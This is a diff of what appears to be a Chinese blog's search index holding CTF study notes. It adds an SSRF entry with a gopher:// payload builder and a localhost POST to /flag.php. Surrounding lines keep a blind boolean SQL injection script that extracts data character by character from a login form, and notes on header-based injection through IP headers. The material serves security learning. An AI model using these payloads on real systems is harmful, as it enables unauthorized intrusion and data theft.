@@ -9,6 +9,20 @@
       </categories>
   </entry>
   <entry>
+    <title>SSRF的学习</title>
+    <url>/2023/06/04/SSRF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>POST &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1:80<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 36</p>
+<p>key&#x3D;197699688d0025883b252f05e409c554<br>#注意Content-Length那里，必须和你的POST请求长度一样</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">first_code =<span class="string">&quot;&quot;&quot;   &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url_encoded = quote(first_code,safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url_encoded = url_encoded.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">url_encoded = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+url_encoded</span><br><span class="line">url_encoded = quote(url_encoded,safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(url_encoded)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP弱类型比较绕过</title>
     <url>/2023/05/29/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87/</url>
     <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP是一种弱类型语言,这意味着变量的类型是根据上下文自动推断的,不需要强调声明(如c语言),带来方便的同时,也带来了许多安全隐患<br>PHP的比较也分为弱类型(<code>==</code>)比较和强类型(<code>===</code>)比较,还有(<code>!=</code>)和(<code>!==</code>)</p>
@@ -1024,13 +1038,15 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
 <li><strong>判断条件</strong><br>如果条件是以图片的形式显示的,需要写成<code>相对路径.jpg</code>,例如<code>../images/flag.jpg</code>(两个小数点<code>..</code>表示上一个目录)</li>
 <li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="头文件注入"><a href="#头文件注入" class="headerlink" title="头文件注入"></a>头文件注入</h1><ol>
+<h1 id="头信息注入"><a href="#头信息注入" class="headerlink" title="头信息注入"></a>头信息注入</h1><ol>
 <li>如果网站记录了浏览信息或者是IP信息之类,就有可能存在头注入</li>
 <li>有些网站可能需要登入进之后才能进行头注入</li>
 <li>需要注意闭合和列数要保持一致</li>
-<li>本质上几种不同的头文件注入没有区别</li>
+<li>头信息有区别,但是本质上几种不同的头信息注入没有区别</li>
 <li>可以利用hackbar,也可以用抓包软件burpsuite进行请求头的修改<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png" alt="请求头"></li>
 </ol>
+<p>一些代表ip的头信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For（XFF）：用于标识通过代理服务器传输请求时的客户端IP地址。如果使用了多个代理，该头信息可能包含多个IP地址，以逗号分隔。</span><br><span class="line"></span><br><span class="line">X-Real-IP：用于记录通过代理服务器传输请求时的客户端真实IP地址。</span><br><span class="line"></span><br><span class="line">CF-Connecting-IP：用于记录通过Cloudflare CDN传输请求时的客户端IP地址。</span><br><span class="line"></span><br><span class="line">X-Client-IP：用于记录通过代理服务器传输请求时的客户端IP地址</span><br></pre></td></tr></table></figure>
 <h1 id="注入编码"><a href="#注入编码" class="headerlink" title="注入编码"></a>注入编码</h1><p>有时候网站会对<code>cookie</code>或其他的一些注入点进行编码,这时候需要把我们的查询语句编码后再放入指定位置,但注释符也可能无法成功编码,这时候可以利用<code>and &#39;1&#39;=&#39;1</code>类似这样的语句产生注释效果</p>
 ]]></content>
       <categories>
